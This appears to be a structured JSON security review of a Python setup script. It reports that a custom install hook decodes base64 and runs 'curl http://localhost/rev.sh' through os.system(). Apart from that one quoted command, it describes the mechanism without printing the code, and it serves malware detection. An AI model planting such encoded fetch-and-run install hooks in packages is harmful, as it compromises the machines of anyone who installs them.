  "purpose": "Define a Python package setup script that includes custom post-installation behavior.",
  "sources": "The function notmalfunc() calls os.system() with decoded base64 data, which executes a command.",
  "sinks": "os.system() executes a shell command decoded from base64, which may lead to remote code execution.",
  "flows": "b64d() decodes base64 string -> notmalfunc() executes decoded string via os.system() -> potentially executes remote URL.",
  "anomalies": "Base64 decoding of a command string which is then executed via os.system() is suspicious. The URL suggests a remote connection, potentially malicious.",
  "analysis": "The script sets up a Python package with custom install and develop commands. Notably, the notmalfunc() function decodes a base64-encoded string which results in 'curl http://localhost/rev.sh'. This command is executed during the install process via os.system(), which can download and run malicious code from the specified URL. The base64 string decodes to a command that initiates a network request to a potentially malicious or controlled server. No other suspicious or malicious code, such as credential harvesting or backdoors, is present. The use of custom commands to execute external scripts or commands after installation is a security concern, especially when decoding and executing commands from encoded strings.",
  "conclusion": "The code contains malicious behavior by decoding and executing a remote command during installation, which can lead to remote code execution or system compromise. The presence of base64 decoding and execution of a remote URL indicates a high security risk.",
